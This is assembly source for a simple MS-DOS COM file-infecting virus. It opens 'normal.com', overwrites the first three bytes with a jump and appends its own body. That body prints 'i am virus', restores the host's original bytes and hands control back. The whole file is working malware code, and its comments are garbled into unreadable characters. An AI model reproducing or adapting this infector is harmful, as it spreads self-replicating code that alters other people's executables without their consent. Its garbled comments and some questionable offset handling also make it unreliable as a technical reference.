org 100h

push	bp
mov	bp,sp
sub	sp,LocalVarSize

;���ļ����ļ��ű�����ax��
mov	ax,3d02h
mov	dx,FileName
int 	21h
mov	[bp-hFile],ax

;���ļ�ͷ�����ֽ�
mov 	bx,[bp-hFile]
mov	cx,3
mov	dx,Normal3
mov	ah,3fh
int 	21h

;��ȡ�ļ���С
mov	ax,4202h
mov	cx,0
mov	dx,0
mov	bx,[bp-hFile]
int 	21h
mov	[bp-pFileSize],ax

;���䱻��Ⱦ�ļ��Ĵ�С
mov	bx,[bp-hFile]
mov	si,VirusSize
loop1:
mov	cx,1
mov	dx,Buf
mov	ah,40h
int 	21h
dec	si
jnz	loop1

;�޸ĸ�Ⱦ�ļ�ͷ3�ֽ�
;�ƶ��ļ�ָ�뵽ͷ
mov	ax,4200h
mov	cx,0
mov	dx,0
mov	bx,[bp-hFile]
int	21h
;��һ�ֽ�
mov bx, [bp-hFile]
mov cx, 1
mov dx, VirusJmp
mov ah, 40h
int 21h

;�ڶ��ֽ�
mov bx, [bp-hFile]
mov cx, 1
push 	si
mov	si,[bp-pFileSize]
sub	si,3
mov	[bp-VirusJmpLong],si
mov	si,bp
sub	si,VirusJmpLong
mov dx, si;dx����ı����ǵ�ַ,�����Ǵ��͵�ֵ
pop	si
mov ah, 40h
int 21h

;�����ֽ�

mov bx, [bp-hFile]
mov cx, 1
mov dx, Buf
mov ah, 40h
int 21h

;�ƶ��ļ�ָ�뵽��Ⱦ�����ĩβ
mov	ax,4200h
mov	cx,0
mov	dx,[bp-pFileSize]
mov	bx,[bp-hFile]
int	21h

;�Ѳ�������д���Ⱦ�����ĩβ
mov	bx,[bp-hFile]
mov	cx,VirusSize
mov	dx,VirusStart
mov	ah,40h
int	21h



end:
add sp, LocalVarSize
pop bp
ret

VirusStart:
;�ض�λ
call	base
base:
pop	bp
sub	bp,base
push 	bp;����bp

;��ӡ�ַ���
 mov	ax, Message
 add	ax,bp;�������ƫ��
 mov	bp, ax	
 mov	cx, 10		
 mov	ax, 1301h
mov	bx, 000ch 
	mov	dl, 0
	int	10h	

pop	bp;�ָ�bpΪ���ƫ��


mov	di,$$
mov	si,Normal3
add	si,bp
mov	bx,di
mov	cx,3
movestart:	;����ǰ���ֽ�
mov	al,[si]
mov	[di],al
inc	si
inc	di
dec	cx
jnz	movestart

jmp	bx

Message: db "i am virus"
Normal3: db "000"
VirusEnd:


hFile equ 2
pFileSize equ hFile + 2 
VirusJmpLong equ pFileSize+2
LocalVarSize equ VirusJmpLong
Buf: db 0
VirusSize equ VirusEnd-VirusStart
FileName:db "normal.com",0
VirusJmp: db 0xe9